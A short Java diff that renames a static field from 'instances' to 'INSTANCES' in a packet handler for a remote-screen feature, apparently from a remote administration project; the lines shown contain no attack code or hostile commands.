@@ -21,7 +21,7 @@ public class Packet26RemoteScreen extends AbstractIncomingPacket {
 		int width = slave.readInt();
 		int height = slave.readInt();
 		
-		FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);
+		FrameRemoteScreen frame = FrameRemoteScreen.INSTANCES.get(slave);
 
 		int blen = slave.readInt();
 	
